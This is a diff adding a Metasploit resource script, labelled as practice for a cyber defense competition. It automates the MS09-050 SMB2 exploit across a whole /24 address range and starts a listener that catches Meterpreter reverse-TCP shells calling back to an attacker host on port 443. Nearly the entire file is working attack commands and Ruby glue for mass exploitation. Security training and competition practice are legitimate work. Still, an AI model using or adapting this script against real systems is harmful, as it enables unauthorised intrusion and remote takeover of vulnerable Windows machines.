@@ -1,0 +1,40 @@
+# Christopher Truncer CCDC Practice 1/25/2013
+# 09_050 autopwn - Similar to 08_067, designed for quickly spamming IP range with this exploit.
+# Modified similar script from from @mubix - awesome dude, very smart guy, check out his blog
+
+# Let's pick our payload
+
+use multi/handler
+setg PAYLOAD windows/meterpreter/reverse_tcp
+
+
+# Set the IP range and port globally
+# Modify the LHOST and LPORT value if you'd like to
+
+setg LHOST 192.168.0.129
+setg LPORT 443
+set ExitOnSession false
+exploit -j -z
+
+
+# Now, let's pick our exploit
+
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+set DisablePayloadHandler true
+
+
+# Let's setup our targets
+# Modify the rhosts value for your target ip range
+
+<ruby>
+require 'rex/socket/range_walker'
+rhosts = "192.168.2.0/24"
+iplist = Rex::Socket::RangeWalker.new(rhosts)
+iplist.each do |rhost|
+
+self.run_single("set RHOST #{rhost}")
+self.run_single("exploit -j -z")
+
+end
+</ruby>
+
